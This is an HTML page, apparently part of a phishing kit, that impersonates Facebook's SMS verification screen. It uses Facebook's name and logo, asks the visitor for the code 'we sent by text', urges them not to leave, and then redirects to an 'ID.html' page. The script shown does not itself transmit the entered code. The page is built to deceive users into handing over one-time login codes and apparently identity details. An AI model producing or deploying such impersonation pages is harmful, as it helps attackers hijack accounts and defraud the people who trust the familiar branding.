<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="./bootstrap.css">
    <link rel="stylesheet" href="./style.css">
    <link rel="icon" href="./image/logos--facebook.svg">
    <!-- For Apple devices -->
    <link rel="apple-touch-icon" sizes="120x120" href="/public/image/logos--facebook iphone.png">
    <link rel="apple-touch-icon" sizes="152x152" href="/public/image/logos--facebook iphone.png">
    <link rel="apple-touch-icon" sizes="180x180" href="/public/image/logos--facebook iphone.png">

</head>

<body>

    <section class="">
        <div class="card mx-auto col-lg-5 col-md-10 col-12 mt-md-5">
            <div class="">
                <p class="fs-1 px-3 pt-2 fw-bold text-primary">facebook</p>
            </div>
            <hr>
            <div class="px-3">
                <h5 class="fw-bold">Enter the Code we Sent by Text</h5>
                <p>We have sent a verification code to your mobile number. Please do not exit while we authenticate you
                </p>
                <div class="lh-1">
                    <input class="form-control my-2 py-2" type="number" placeholder="Code" id="otpnumber">
                    <span class="error-d" id="otpNumberError"><small>Please fill out this field</small></span>
                </div>
                
                <div class="d-flex gap-3 my-3 justify-content-end">
                    <button class="btn btn-secondary fw-medium ">Update Contact info</button>
                    <button class="btn btn-primary fw-medium px-5" onclick="Continue()">Continue</button>
                </div>
            </div>
        </div>
    </section>
    <script>
        const otpNumber = document.getElementById('otpnumber')
        function Continue(){
            if(otpNumber.value == ''){
                document.getElementById('otpNumberError').style.display ='block'
            }else{
                setTimeout(()=>{
                    window.location.href = 'ID.html'
                }, 1000)
            }
        }
    </script>
</body>
</html>
